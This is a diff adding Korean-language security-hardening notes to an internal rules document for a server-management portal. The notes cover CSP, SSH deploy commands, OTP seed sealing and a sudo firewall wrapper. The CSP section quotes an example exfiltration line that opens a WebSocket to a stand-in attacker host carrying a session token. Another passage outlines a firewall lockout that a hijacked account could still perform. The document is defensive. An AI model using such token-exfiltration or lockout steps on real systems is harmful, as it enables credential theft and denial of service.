@@ -38,6 +38,13 @@
 - (v2.976) 집중 모니터링 — admin + 전체 범위 · 키 로그인만 · 인증 거부 자동 재시도 금지 · 프로세스 comm 만 · 원격 명령 상수
 - (베어메탈 사용률 점검 6회차 A1 추가) 공용 게이트 fullScopeOnlyWith · requireSettingsOwner — 안전 메서드(GET · HEAD · OPTIONS)는 조회 범위만 · 그 밖은 조회 ∧ 쓰기 전체(isFullReadWriteScope) · 사유 따로 · 던지면 거부 · 읽기성 POST 예외 1 · 소유자 GET 도 조회 ∧ 쓰기 전체(2026-11-19 결정)
 - (163~165회차 추가) 본문 값의 모양 검사는 `util/coercionTrap.js textFields` — 순서는 권한 판정(403) → 모양(400) → OTP · 받는 쪽을 막으면 읽는 쪽도
+- (보안 잔여 11-27 추가) 중계 서버 SSH 자동 배포 명령 — 값을 정한 주체로 신뢰를 나눈다(env 그대로 · 화면 값은 정규형만) · '접속 전 설정 거절' 집합 · 철거 보류는 한 방향 · 시한 없음 · SSH 창 크기 정수(M1 · L6)
+- (보안 잔여 11-27 추가) CSP connect-src 에 스킴 전체 · * 금지 — 'self' + 기본 정책일 때만 검증된 Host 의 ws/wss · /intro '토큰 없음' 정정(L13 — CSP 항목 안)
+- (보안 잔여 11-27 추가) users.json OTP 시드 레코드 단위 봉인 — 원 감사 권고를 택하지 않은 이유 · 키 확인 값 · 흔적 판정은 시드 칸만(M3)
+- (보안 잔여 11-27 추가) root 로 넘기는 sudo 는 인자 무제한 명령 금지 — root 소유 인자 검사 래퍼 · 판정 코어는 래퍼 하나 · ENOENT 만 옛 경로(M-5)
+- (보안 잔여 11-27 추가) 번들 런타임 해시는 두 채널 대조 · 런타임 보안 하한은 별도 필드 · 자동 업그레이드는 런타임을 바꾸지 않는다(G4)
+- (보안 잔여 11-27 추가) pyportal 허브 인바운드 수신 — 단계마다 전체 시한 · 자리는 스레드 전에 · 되찾기는 연결 단위 누계(L12)
+- (server/CLAUDE.md 에서 옮김 2026-11-27) 7b · 8a · 8b 서버 불변조건 요약 원문
 
 ## 본문
 
@@ -351,9 +358,20 @@
     스크립트가 아니다 — 이것을 빼면 화면이 통째로 깨진다).
   - `/intro` 완화가 안전한 근거: 실데이터·API 와 분리된 셀프부트 정적 데모이고 세션 토큰이 없다
     (v2.577 확인 — 사설 IP 0건·법인 문자열 0건·vCenter 이름 0건). **완화 정책을 앱으로 넓히지 말 것.**
+    ⚠ 정정(보안 잔여 11-27 L13): '세션 토큰이 없다' 는 틀렸다 — `/intro` 는 메인 앱과 **같은 출처**라 그 페이지(완화 정책 — `'unsafe-eval'`)의 스크립트가
+    localStorage 의 메인 앱 토큰을 읽을 수 있다(기존 · 범위 밖 — `index.js` 주석만 정정했다). 데이터가 없다는 확인은 그대로 맞다.
   - ⚠ **CSP 를 바꿀 때는 A/B 로 회귀 0을 확인할 것** — v2.577 은 `CSP=off` 와 켠 상태의 콘솔
     오류가 **21건으로 동일**함을 확인했다(남은 오류는 이 컨테이너가 외부 CDN 을 막아 생기는 기존
     현상). 탈출구 `CSP=off`·`CSP=<정책>` 을 없애지 말 것.
+  - ⚠⚠ **`connect-src` 에 스킴 전체(`ws:` · `wss:` · `http:` · `https:`)나 `*` 를 넣지 말 것**(보안 잔여 11-27 L13 · `util/csp.js` · 회귀 `server/test/secResidual1127Csp.test.js` · 변이 26 중 25):
+    v2.577 의 `connect-src 'self' ws: wss:` 는 모든 호스트의 ws/wss 를 열어, 주입된 스크립트가 `new WebSocket('wss://attacker/?t='+token)` 으로 토큰을 내보내도 CSP 를 통과했다
+    (Chromium 실측 — 주석은 '같은 출처' 라 적어 코드와 어긋났다). 기본 정책은 `connect-src 'self'` 이고 같은 출처 원격 콘솔(SSH · RDP WS)은 CSP3 `'self'` 가 포함한다.
+    구형 WebKit 대비로 **기본 정책일 때만** 검증된 원 Host 헤더의 ws/wss 를 명시로 덧붙인다(`sameHostWsSources` · `withConnectSources` — 형식 밖 · IPv6 리터럴 · 주입 글자는 덧붙이지 않고
+    X-Forwarded-Host 는 따르지 않는다 · `/intro` 와 사용자 env 정책에는 붙이지 않는다). 사용자 env `CSP` 는 바꾸지 않고, off 이거나 연결처를 넓게 여는 정책이면 기동 경고 한 줄(`cspEnvNotes`).
+    connect-src 는 fetch · XHR · WS 반출만 막는다 — 탐색(`location.href` · `window.open`) 반출 · WebRTC(추정) · 같은 출처 쓰기 경로를 통한 간접 반출은 CSP 로 못 막고 **1차 방어는 script-src** 다.
+    웹은 WebSocket 을 `sshWsUrl` · `rdpWsUrl`(location 기준) 두 곳에서만 만든다(시험 C6 스윕 — EventSource · sendBeacon · XHR · 절대 주소 fetch 0). 새 연결처가 필요하면 그 출처만 명시하고 이 스윕을 고친다.
+    역방향 프록시는 `proxy_set_header Host $http_host`(포트 유지)를 쓴다 — `$host` 는 포트를 떼어, 기본 포트가 아닌 공개 포트에서 덧붙는 소스가 틀려진다(구형 WebKit 대비책만 조용히 빠진다 · `docs/MAINTENANCE-PAGE.md` 예시 정정).
+    남긴 것: 구형 WebKit 근거(201591 → 235873)는 원문 미확인(추정) · 서비스 워커 오프라인 폴백이 옛 헤더를 단 index.html 을 줄 수 있음(네트워크가 없을 때만) · 위험한 env CSP 경고가 점검 화면에는 없음.
   - ⚠ **HSTS 를 기본으로 켜지 말 것**(정직 기록): 이 현장은 IP + 자체서명 접속이 흔한데 HSTS 는
     그 출처의 http 를 **영구히** 막는다. 현재의 '실제 https 일 때만' 조건을 유지한다.
   - ⚠ **정직 기록**: `/intro` 는 외부 CDN(jsdelivr·Google Fonts)에 의존한다 — 폐쇄망에서는 글꼴만
@@ -691,6 +709,23 @@
       (쌍 = `|키@노드` · 고르는 값 `-@<노드>` · 후보에 `pick` · `via`(이 노드도 agent 이름이 있어 단추가 ‘엣지 <이 노드>’ 로 보였다 — 2차 재확인 G4) — 사유 수 = 후보 수 = 버튼 수 · 범위 계정은 귀속 없음을 못 본다). 반증 F5: 시험 ⑤ 소스 스윕은 첫 인자 이름과 무관하게 호출을 세고
       `vcenterId` 값이 요청에서 온 식인지 · 대상 목록을 읽는 함수 안 키 비교 선택 · 키 맵이 허용 목록에 있는지 본다(반증 변형 5종이 걸린다 — 시험이 고정).
 
+- **(server/CLAUDE.md 에서 옮김) 7b · 8a · 8b — 서버 불변조건 요약 원문**(2026-11-27 보안 잔여 11-27 — server/CLAUDE.md 크기 상한 40,000B 에 닿아 그 자리에는 한 줄 포인터만 남겼다.
+  아래 네 단락은 옮기기 전 문구 그대로이고 '되돌리지 말 것' 은 그대로 유효하다. 상세는 이 파일의 7b · 8a · 8b 항목과 `idrac-server.md` · `edge.md` · `perf-db.md`):
+  - **7b SSH 키 저장소(`bmusage/onboard/keyStore.js` · `ssh-keys.json`)**: 관리 = 소유자 등급 + 본인 OTP(`reauth` 는 마지막 게이트) · 응답 · 감사 · 백업 · 엣지 push 에는 지문 · 공개키만
+    (번들 가림 `keyBundle.js` — 봉인본도 싣지 않음) · 손상이면 쓰기 거절(로드 먼저) · 주소가 바뀌면 `keyRef` · `credRef` 승계 없음 · 키가 없으면 비밀번호로 넘어가지 않음 ·
+    키 서버는 엣지 위임 잡에 싣지 않음 · **저장 비밀을 주소에 묶는 쓰기(CSV · bm-storage keyRef/credRef · iDRAC 사본 · 엣지 배포)도 소유자 등급 + OTP**(r2) ·
+    복호 실패 중 쓰기 거절 · 퇴역 키 접속 거부. **묶음 판정은 `bmusage/onboard/bindRule.js` 하나 · 등록부 `applyServerInput` 이 choke point** — `bindApproved === true` 는
+    게이트를 통과한 호출만 세운다(bm-storage 라우트 OTP 뒤 · 온보딩 `plan.binds` · 엣지는 행의 중앙 승인 `bindOk`) · 새 쓰기 경로도 이 함수를 지나게(r3 R-N1). **키 배치(폴더 · 허용 기능)는 쓰기 때도 접속 때와 같은 판정**(`onboard/placement.js keyPlacementIssue` — 분석 · bmBindCheck · 회전: 폴더 밖 거부 · 기능은 경고 — 4회차 D1). 상세 `docs/rules/security-api.md` 7b 항목 ⑨ ⑩ ⑪.
+  - **8a 정비 창(`bmusage/maint/*` · `routes/api/bmMaint.js`)**: 억제를 **늘리는** 쓰기(법인 · 태그 · 12h 초과 창 만들기 · 고치기 전/후 · 재확인)는 소유자 등급(`isOwnerTier`), 줄이는 쓰기(지금 끝내기 · 지우기)는 쓰기 범위 ·
+    판정은 `maint/judge.js` 하나(서버 · 엣지 · 화면) · **억제에는 시한**(발생 끝 · 길이 상한을 계산에서도 · 반복 92일 재확인 · 엣지 배포본 24h) · 못 읽은 창 파일은 억제가 아니다 ·
+    인증 거부(authGuard)는 창과 무관 · 배포 인출은 개별 토큰만 · 엣지는 같은 `normalizeWindow` 로 다시 자른다. **서버 대상 = (법인, 키) 쌍**(판정 · 배포 · 쓰기 — IP 키는 법인끼리 겹친다) ·
+    12h 소유자 규칙은 **같은 서버를 덮는 창 전부(소유자 · 법인 · 태그 창 포함)의 합**(`store.coverNeedsOwner` · 재확인 포함 · approvedBy 는 기록만) · rev 없는 쓰기 409 · 해제 알림은 억제하지 않는다 · **재확인은 재확인 라우트 하나**(고치기는 confirmedAt 을 바꾸지 않는다 — 점검 반복 3회차) · 엣지 배포 history 창은 지난 구간 제외용이라 **지금 판정(억제)에서 뺀다**. 상세 `docs/rules/{idrac-server,security-api,edge}.md` 8a 항목.
+  - **SSH exec 안 timeout 합 + 여유 ≤ 그 exec 시한**(8b 반증 F1 — 4 · 5단계부터의 결함): 주 명령은 exec 하나라 넘치면 그 주기 전 구획을 잃는다 — 새 구획 · exec 는 `test/bmTop8bBudget.test.js` 기계 산수를 지킨다(needs-restarting ↔ dnf 한 주기 하나).
+  - **8b Top-N · 저활용 · 전력(`bmusage/{parse/linuxTop,topStore,idle,powerAgg}.js` · `routes/api/{bmTop,bmIdle,bmPower}.js`)**: Top-N 은 **같은 세션 별도 exec**(주 명령 밖 · 실패 격리) · **comm 만**(인자 · 환경 · 열린 파일 · kill 없음 —
+    top COMMAND 열은 셸 밖으로 내지 않는다) · 줄마다 고정 접두 · awk getline 으로 /proc 을 읽지 않는다(mawk 중단) · 권한 없는 I/O = null · 프로세스 사용자 이름은 관리자 판본만 원문 ·
+    전력 · 저활용은 **범위로 서버를 먼저 거른 뒤** 합한다 · 집계 cfg 에 설정 원본(전 법인 랙)을 넘기지 않는다 · 검토 쓰기 = (법인, 키) 쌍 · 404 → 403 · 비관리자는 계정 단서(gpdb)도 숨김 ·
+    저활용 활동은 포탈 수집 로그인 제외 · 랙 여유는 다 측정된 랙만 · 상세 `docs/rules/{idrac-server,security-api,edge,perf-db}.md` 8b 항목.
+
 - **(v2.976) 집중 모니터링 API · 수집**(`routes/api/focusMon.js` · `server/src/focusmon/CLAUDE.md`):
   - 조회는 `requireRole('admin')` + `fullScopeOnly`(전 법인 서버 주소 · 프로세스가 나온다 — 대상이 vCenter 귀속이 아니라 범위 계정에 나눌 축이 없다) · 쓰기는 전체 쓰기 범위 · 데모 계정 쓰기 차단 · CSV 는 `data.csv` 권한.
   - 등록부에 비밀 없음(IP · 포트 · 계정 · 담당 노드). 접속은 노드가 만든 키(`util/sshKeyStore.js` — 아이실론 키와 같은 공장)만 · 응답에는 공개키 · 지문만.
@@ -745,6 +780,33 @@
   저장된 SSH 비밀번호 · 개인키로 도는 `test -r <경로>` 에 그대로 넣어, 설정을 바꿀 수 없는 범위 관리자가 중계 서버에서 임의 명령을 돌리고 출력을 받았다. 판정은 `proxy/registry.js haproxyCfgPathIssue`
   (절대 경로 · 영숫자와 . _ - / · 255자) 하나 — 저장(`deployTargetIssue`) · 시험 · 배포(`proxy/deploy.js`)가 같이 부른다. '저장할 때만 검사' 는 시험 라우트처럼 **저장을 거치지 않는 값**을 놓친다.
   새 원격 실행 경로를 만들면 '요청 값이 저장된 자격증명과 함께 셸에 닿는 길' 을 먼저 그린다. 회귀 `server/test/full157.test.js`.
+- **중계 서버 SSH 자동 배포의 검증 · 재적재 명령은 값을 정한 주체로 신뢰를 나눈다**(보안 잔여 11-27 M1 — 2026-11-08 감사 C-1 · 157회차가 경로만 막고 남긴 것 · 판정 코어 `proxy/registry.js resolveDeployCmd` 하나 ·
+  회귀 `server/test/secResidual1127Proxy.test.js` 16건 · 웹 `proxyDeployCmd1127` · 변이 54/54 + 20/20):
+  - portal.env `PROXY_VALIDATE_CMD` · `PROXY_RELOAD_CMD`(root 소유 — 호스트 운영자 값)는 문법 검사 없이 그대로 실행하고 **호출 시각에** 읽는다(`operatorDeployCmd` — 모듈 로드 때 굳히지 않는다 ·
+    명령 칸을 비운 모든 중계 서버에 적용). 예전에는 빈 칸('')이 env 를 무시하고 내장값을 썼다 — 이제 env 를 따른다. `DEFAULTS.deploy` 에서 두 명령을 뺐다(첫 저장이 env 값을 파일에 박던 것).
+  - 화면/API 로 저장 · 요청된 값은 문법의 **정규형**만 실행한다(원문을 셸로 보내지 않는다). 검증 `[sudo -n] <haproxy> -c [-q] [-V] -f {file} [-f /etc/haproxy/…]×0..4`(플래그 순서 무관 · `-f {file}` 은 한 번 ·
+    실행 파일은 고정 집합 + `/opt/rh/<이름>/root/usr/(s)bin/haproxy` · `/opt/haproxy/(s)bin/haproxy`) · 재적재 `[sudo -n] systemctl reload|restart|reload-or-restart|try-reload-or-restart <haproxy 유닛>`
+    또는 `[sudo -n] service <haproxy 이름> reload|restart`(템플릿 유닛은 `haproxy` 가 `@` 앞에 — 'getty@haproxy' 거절). sudo 는 정규형에서 `-n` 강제 · 길이 300 먼저 · 글자 집합 하나 · split 만(ReDoS 없음).
+  - 저장(saveConfig · saveProxy) · 시험(testDeploy — 요청 본문 포함) · 상태 확인 · 배포(라우트 · provision · 만료)가 같은 함수다. **문법 밖 옛 값은 버리지도 실행하지도 않는다** — 접속 전 거절(code `deploy-cmd-invalid`) ·
+    GET `/config` · `/proxies/full` 의 `deployCommands`(deploy 밖 형제 칸 — 실효 명령 · 출처 · 사유 · 형식 안내 `DEPLOY_CMD_HELP`)로 보이고, 다른 칸 저장은 '바뀌지 않은 같은 글자' 예외로 통과한다. 빈 칸 저장은 키 삭제(= 기본값).
+  - **'접속 전 설정 거절' 은 스스로 낫지 않는 거절이다**: 명령(`deploy-cmd-invalid`)과 설정 파일 경로(`deploy-path-invalid` — 157회차 `haproxyCfgPathIssue`) 두 가지이고, `proxy/deploy.js isDeployConfigRefusal` 하나로
+    일시 실패(접속 실패 등 — 예전처럼 지운다)와 가른다. 등록부 쪽 문구는 `registry.deployConfigRefusal` 이 만들고 기동 경고도 같은 함수를 쓴다. **새 '접속 전 거절' 을 만들면 code 를 이 집합에 넣을 것** — 넣지 않으면 철거가 열린 포트를 숨긴다.
+  - **철거 보류(`teardown-pending`)는 한 방향이다**: 이 거절로 철거(삭제 · 만료)하지 못한 매핑은 지우지 않고 보류로 남긴다 — 블록에서 빠지고 공개 포트는 계속 차지한다
+    (지우면 만료된 임시 접근의 HAProxy 공개 포트가 화면 밖에서 열린 채 남는 fail-open — 설계 반증 must). 상태 판정은 `registry.setMappingStatus` 하나이고, 보류에서 다른 상태로 가는 쓰기는 무시한다(false).
+    빠져나가는 길은 철거에 성공한 뒤의 `removeMapping` 하나뿐이다. HAProxy 를 다시 여는 동작(Data Plane `applyMapping` · provision)은 그 전에 보류인지 먼저 거절한다 — 재적용 라우트 409 · `doProvision` ·
+    `GET /rdp/:id` 409 · 게이트웨이 접속 · quick-connect 재사용 차단 · DELETE 409 · 만료 작업이 매 주기 재시도. 성공한 SSH 배포 뒤 정리(`provision.finishSshDeploy`)는 **실제로 배포한 목록**으로 판정한다(블록에 든 매핑은 지우지 않는다).
+    **매핑 상태를 바꾸는 새 경로를 만들면 이 함수를 지나게 할 것.**
+  - **철거 보류에는 일부러 시한을 두지 않는다**(루트 '보류에는 시한' 규칙의 의도된 예외) — 시한이 지나 지우면 위 fail-open 으로 돌아간다. 탈출구는 명령 · 경로 칸을 고치거나 비우는 것, 또는 자동 배포를 끄는 것이고,
+    그러면 다음 만료 주기에 정리된다. 로그는 만료 주기당 1줄 · 접속 전 거절 경고는 같은 중계 · 같은 칸마다 5분에 한 번(프로세스 메모리 Map — 다중 프로세스 구성이면 프로세스마다 센다).
+  - 매핑 오류 · 비관리자 DELETE 409 사유에는 구성 단서(env 이름 · 명령)를 싣지 않는다(관리자 판본은 `isAdminDetailUser`) · 원격 검증 · reload 출력은 6줄 · 600자로 자른다.
+  - **L6 웹 SSH 창 크기**: `proxy/sshGateway.js termDim`(정수 1~1000) 하나로 shell 초기 크기(없으면 80x24)와 resize(틀린 프레임은 무시)를 고친다 — 예전에는 -1 · 1e9 · 1.5 가 대상 sshd 의 pty 요청에 그대로 실렸다.
+    ⚠ 정정: 원 감사 L6 의 '동기 예외(`stream.write(null)` throw)' 는 ssh2 1.17.0 에서는 일어나지 않는다(코드 판독) — 남은 결함은 수 범위였다. ssh2 를 올리면 다시 볼 것.
+  - 정정(1회차 보고): '거절된 철거는 매핑을 지우지 않는다' 는 1회차에는 명령 거절에만 해당했다(경로 거절이 빠졌다 — 반증 1회차 S-1) · '보류 매핑은 게이트웨이 접속 · quick-connect 재사용을 막는다' 는
+    관리자 재적용 라우트 하나로 깨졌다(반증 1회차 R-1 재현 — 지운 매핑이 'error' 로 덮여 되살아났다). 둘 다 위 규칙으로 고쳤다.
+  - **남긴 것**(반증 2회차 should — 메인 판단): S2-1 NSX 중계 다이얼(`nsx/proxy.js ensureNsxDial`)이 보류 매핑을 status 를 보지 않고 재사용한다(소비처 누락 · 실행 재현) ·
+    S2-2 배포된 적 없는 매핑도 보류가 되어 설정이 문법 밖인 동안 지울 수 없는 매핑이 쌓이고, 보류 N건이면 만료 주기마다 전체 파일 동기 쓰기 N번(실행 재현 · 성능은 추정) ·
+    S2-3 Data Plane 철거 실패를 성공으로 본다(기존 · 판독) · 배포 방식 전환(SSH → Data Plane) 뒤 옛 SSH 블록의 listen 잔존(추정) · `haproxyConfigPath` 는 글자만 보고 위치는 제한하지 않는다 ·
+    명령 칸 변경의 감사 로그 없음 · 관리자 능동 알림 없음 · 실제 haproxy · SCL 경로 실행 미확인(컨테이너에 haproxy 없음).
 - **AD 세션의 단일 세션 등록 키는 접은 키**(157회차 B1 — 합성 LDAP 재현): 세션 이름이 곧 등록 키라 같은 AD 계정을 `kim` · `KIM` 으로 따로 로그인하면 서로를 끊지 못했다(ID 공유 금지 우회).
   AD 세션은 `auth/ad.js adAccountKey` 로 등록 · 검사 · 로그아웃하고(로컬 계정은 이름 그대로) 실제 이름은 기록의 `user` 에 둔다. 업그레이드 전에 이름으로 등록된 기록은 접은 키의 기록이 없을 때만 인정한다(전원 재로그인 방지).
   남은 결정: 로그인 잠금 키 표기 갈림(P1). **세션 이름 정규화(P2)는 보류**(2026-11-20 사용자 결정) — 발급 때 이름을 정규화하면 기존 현장의 소유자 목록 · 권한 재정의 · 감사 기록 · 작성자 판정이 저장해 둔 표기와 어긋난다(이름이 열쇠인 자리의 이관이 먼저).
@@ -757,3 +819,68 @@
   - **받는 쪽을 막았으면 읽는 쪽도**: 막기 전 판이 저장해 둔 틀린 모양은 남는다 — 목록 · 고르기 경로가 던지지 않게 한다(`net/monitor.js healStoredShapes` · `proxy/registry.js resolveProxy`). 저장 뒤 응답에서 던지면 그 뒤 조회까지 막힌다(net/monitors · remote/proxies 실례).
   - `strOf`(객체 → '')로 조용히 바꾸지 않는다('' 가 기본값 · 전체로 읽히는 칸이 있다) · 전역 오류 처리기에서 400 으로 바꾸지 않는다(157 판정 — 던진 시점에 상태가 바뀌었는지 모른다).
   - 시험: 게이트 순서는 **로그인을 켠 채 등급이 다른 계정**으로 · 퍼징은 **정상 기준 본문 + 칸 하나**로(앞 검사가 뒤 변환을 가린다). 회귀 `decide163` · `rebut165`. 남은 꼴: 배열 원소가 객체(`ids.map(String)` 류 8곳) · `POST /api/admin/agent-deploy`.
+
+- **users.json OTP 시드는 암호화 정책에서 레코드 단위로 봉인한다**(보안 잔여 11-27 M3 — 2026-11-08 감사 D-1 · `security/secretVault.js` · `auth/auth.js` · 상세 `server/src/security/CLAUDE.md` ·
+  회귀 `server/test/secResidual1127TotpSeal.test.js` 35건 · 변이 37 중 36 + 23/23):
+  - users.json = `SECRET_FILES` + 파일 한정 필드(`USER_SECRET_FIELDS` — totpSecret · totpPendingSecret). load/save 는 `openRecordFields`/`sealRecordFields`(auth.js)이고 **일반 경로(open/sealSecretsDeep)는 쓰지 않는다**.
+    정책 전환 · 흔적 · 0600 점검 · 화면 '적용 대상 파일' 목록 · 평문 점검(secretScan 이 파일 한정 필드를 센다)이 같은 등록을 본다. 평문 정책은 바이트 동일.
+  - **원 감사 권고(전역 `SECRET_FIELDS` + 일반 경로)를 택하지 않은 이유 3가지**: ① 일반 경로는 키 없음 · 잠금에서 비밀 파일 저장을 거절한다(22회차) — users.json 은 로그인 카운터 · tokenVersion · 비밀번호 변경이
+    같은 파일이라 로그인 · 비밀번호 변경 저장이 막힌다 ② 복호 실패를 '' 로 열어 다음 저장이 암호문을 지운다 ③ 시드가 '' 가 되면 OTP 전용 계정이 비밀번호 경로로 내려간다.
+  - 복호 실패 시드는 **암호문 그대로** 메모리에 둔다 — 지우지 않음 · 비밀번호로 내려가지 않음 · 소비처 `isSealed` 가드(`OTP_SEED_UNREADABLE` 은 실패로 세지 않음) · TOTP 시드는 엄격 base32
+    (관대한 해석은 봉인 문자열의 글자로 키를 만들어 users.json 을 가진 사람이 코드를 계산할 수 있었다). 잠금 · 키 없음에서도 시드를 바꾸지 않는 쓰기는 디스크 원문을 승계하고, 새 시드만 `newSecretSealIssue` 로 미리 거절한다.
+  - **키 확인 값**(설계 반증 M-1 — 콘솔 도구가 포탈과 다른 키로 봉인하면 재시작 뒤 복구하려던 관리자가 잠긴다): 포탈이 자기 키로 봉인한 상수를 `CONFIG_DIR/secrets-keycheck` 에 **비동기로** 쓰고
+    (scrypt 를 libuv 스레드에서 — 이벤트 루프 미차단), 콘솔 도구는 `disallowKeyCreation`(키 생성 · 키 확인 값 쓰기 · 자동 봉인 없음) 상태에서 그 값을 자기 키로 열어 **같은 키일 때만** 새로 봉인한다.
+    HMAC 이 아니라 같은 KDF 강도의 봉인 상수인 이유: 빠른 검증값은 약한 SECRETS_KEY 의 오프라인 대입 비용을 낮춘다. ⚠ 콘솔 도구 모드가 아닌 프로세스는 '포탈' 로 본다 — **키를 쓰는 새 독립 실행 스크립트는 `disallowKeyCreation()` 을 부를 것**.
+  - 반증 1회차(재현 3건): M-1 흔적 판정(`encryptionEvidence`)은 users.json 을 **파싱해 시드 칸만** 본다(파싱 못 하면 원문 정규식 — 보수 쪽). 원문 정규식이면 범위 admin 이 자기 표시 이름을
+    봉인 모양으로 바꾸기만 해도 정책 파일 없는 평문 설치가 정책 잠금이 됐다. M-2 root 소유 래퍼(`packaging/offline/release-verify-lib.sh vp_launcher_secrets_key` — 링크 · FIFO · 64KB 초과 거절 · 한 번 열기)가
+    root:root portal.env 의 SECRETS_KEY 를 **환경으로** 넘긴다(명령줄 금지 · git 소스 래퍼는 `sudo --preserve-env=SECRETS_KEY` · 해석 사본 `vp_env_key_value` 3벌은 글자 동일 + JS `parseSecretsKey` 와 같은 입력 대조).
+    M-3 봉인 흔적이 있는데 키가 없으면 포탈 · 도구 · 복원 예약 경고 · 자가 점검 · 콘솔 메뉴가 `KEY_LOST_GUIDE`(SECRETS_KEY_LOST=true 로 한 번 재시작)를 싣고, 복호 실패 안내는 프로세스 · 키 상태별로 갈린다(`seedOpenFailureHint`).
+  - **22회차 D-9 의 '원문 정규식 흔적' 은 사용자가 쓸 수 있는 칸이 있는 파일에서는 권한 경계 문제다**(범위 admin → 전 법인 잠금). users.json 은 파싱으로 고쳤다.
+  - 정정: (a) 감사 · 설계 단계의 'openSecretsDeep 는 키 이름과 무관하게 복호한다' 는 틀렸다 — 21회차 M-2 이후 비밀 칸만 연다. (b) 구현 보고의 'portal.env 를 못 읽어도 키 확인 값이 맞으면 진행' 은
+    키 파일 설치에서만 참이었다(env 키 설치는 도구에 키가 없어 등록 0 — 반증 재현). (c) 1차 거절 문구 '기존 OTP 로그인은 그대로 됩니다' 는 키 분실 계정에는 거짓이었다(이제 그 계정 시드를 열 수 있을 때만 붙인다).
+    (d) 설계의 '기동 경로라 요청 경로 정지 아님' 은 틀렸다 — warnIfNoOtpAdmin 조건이 아니면 첫 요청이 salt 마다 scryptSync 를 돈다(서로 다른 salt 가 4개를 넘으면 다음 저장에서 세션 키로 재봉인 — `sealRecordFields`).
+    (e) 설계의 'migrate 가 세션 키 하나로 정리' 도 틀렸다(migrate 는 재사용한다 — 정리는 (d) 의 갈래가 한다).
+  - **남긴 것**: 다른 SECRET_FILES 의 흔적 판정은 여전히 원문 정규식(범위 계정이 쓸 수 있는 이름 칸이 있는지는 미확인 — 다음 점검 첫 후보) · 평문(기본) 정책과 중앙이 받은 엣지 사본(`central/agentConfig.js`)의
+    평문 시드(반증 S-3 · S-7 — 메인 판단) · 웹 사용자 관리에 `otpUnreadable` 표시 없음 · Windows 패키지의 SECRETS_KEY · SECRETS_KEY_LOST 전달 미확인 · 반증 2회차 should 5건(S-A 키 파일 읽기 오류 갈래에
+    KEY_LOST_GUIDE 를 싣지 않는다는 시험 없음 · S-B git 소스 래퍼의 링크 portal.env 검사 시험 없음 · S-C Windows 에서 쓸 수 있는 OTP 복구 명령 안내가 사라짐 · S-D 도구가 portal.env 를 못 읽은 상태에도 '키가 없습니다' ·
+    S-E 실행 중인 포탈의 실제 환경에서 키를 얻는 설계 제안).
+
+- **root 로 넘기는 sudo 는 인자 무제한 명령을 허용하지 않는다 — root 소유 인자 검사 래퍼**(보안 잔여 11-27 M-5 — 2026-09-12 감사 M-5 · 2026-11-08 OLD-1 · 사용자 결정 '래퍼로 제한' ·
+  `packaging/offline/vmware-portal-firewall-cmd` → `/usr/local/libexec/vmware-portal-firewall-cmd` · 상세 `server/src/hostaccess/CLAUDE.md` '실행 경계' · 회귀 `server/test/secResidual1127FwWrapper.test.js` 16개 · 변이 45 중 44):
+  - 래퍼의 꼴: `#!/bin/bash -p` · readonly 고정 경로 · `env -i` · 검증한 변수만 exec · 앵커 + 유한 반복 정규식 · 길이와 글자를 먼저 · 거부는 종료 64 + 고정 접두(원문을 찍지 않는다) ·
+    외부 조회(기본 존)에 시한(`timeout -k 1 5`). 받는 것은 포탈이 실제로 만드는 인자 형태뿐이다(1인자 `--state` · `--get-default-zone` · `--reload` · `--runtime-to-permanent`, 2인자 `--zone=<기본 존>` +
+    list-all · ssh 서비스 · http/https 제거 · P/tcp 포트 · render 가 만드는 rich rule 네 형태 add · ssh/포트 요소의 정규형 remove).
+  - **판정 코어는 래퍼 하나** — 서버 사전 검사(`hostaccess/exec.js` `fw.validate`)는 같은 파일을 권한 없이 `--vp-validate-only` 로 실행한다(JS 사본을 만들지 말 것). 하나라도 거부면 적용 0건.
+  - 서버는 래퍼가 **ENOENT 일 때만** 옛 경로(`/usr/bin/firewall-cmd` 직접)로 가고, 그 밖의 stat 실패 · 소유자 · 권한 · 링크 이상은 실행하지 않는다(`wrapper-unsafe` — fail-closed).
+    바꿔치기 방지는 install.sh 의 길 판정(`vp_path_controllers`)이고 서버 확인(`wrapperState`)은 알림이다 — sudo 는 명령 파일의 소유자를 보지 않는다. 실행 방식은 실행기 함수에 붙여(`fw.runner`) 가짜 실행기 시험이 호스트 상태로 갈리지 않게 한다.
+  - 업그레이드: 자동 업그레이드 · 중앙→엣지 push · 수집기 업그레이드는 서비스 계정으로 앱 트리만 바꾼다(유닛 `User=` · `ProtectSystem=full` · `ReadWritePaths`) — sudoers 와 `/usr/local/libexec` 는 바뀌지 않는다.
+    옛 설치본은 direct 모드(옛 argv 그대로)로 예전처럼 돌고 계획 단계에 `LEGACY_SUDO_NOTE`(root 설치는 `LEGACY_ROOT_NOTE`)가 붙는다. 좁혀지는 것은 root 가 새 패키지의 install.sh 를 다시 실행할 때와
+    중앙의 엣지 재배포(`agent/deploy.js` — root SSH 로 install.sh)일 때뿐이다. sudo 거부 화면의 `SUDOERS_HINT` 는 래퍼 줄 + sshd 줄이고 'install.sh 재실행' 을 먼저 권한다(래퍼 파일 없이 줄만 넣으면 sudo 가 거부한다).
+  - 형제 결함: `render.isManagedRich` 의 'port port=' 앞 공백 앵커가 없어 forward-port · source-port rich rule 을 포트 요소로 오인해 지웠다 — 고쳤다(시험 ★15 · 변이 R1/R1b).
+  - **남긴 것(기능 정의라 더 좁힐 수 없음 — 타협)**: 탈취된 계정은 래퍼로도 기본 존에서 아무 tcp/udp 포트 · 출발지의 accept/drop rich rule 추가 · ssh/http/https 와 관리자 규칙 삭제 · `--runtime-to-permanent` · `--reload` 를 할 수 있다 —
+    `port="1-65535" ... drop` + ssh 제거 + 영구화로 콘솔 말고는 복구할 수 없는 잠금(DoS)이 가능하다. 막힌 것: 기본 존 바꾸기 · target · 다른 존 · panic · direct/passthrough · forward-port/masquerade · ipset · icmp · lockdown ·
+    `--*-from-file` · `--permanent` 직접 쓰기. 그 밖: `rma/deploy.js`(원격 RMA 배포 — root 로 sudoers 직접)의 방화벽 유닛 처리 미점검(install.sh 는 RMA_SERVICE_UNITS 의 방화벽 유닛을 경고만) ·
+    Rocky 9 firewalld rich rule 정규형 · SELinux Enforcing 실행 라벨 실서버 미검증(추정) · 문법 밖 관리 대상 규칙(mark 등)이 있는 존은 래퍼 모드에서 적용이 막힌다(예전에는 포탈이 지웠다 — 동작 변화) ·
+    한 호스트의 여러 prefix 설치는 래퍼 · sudoers 를 함께 쓴다(uninstall 이 함께 지운다 — 기존 sudoers 와 같은 한계).
+
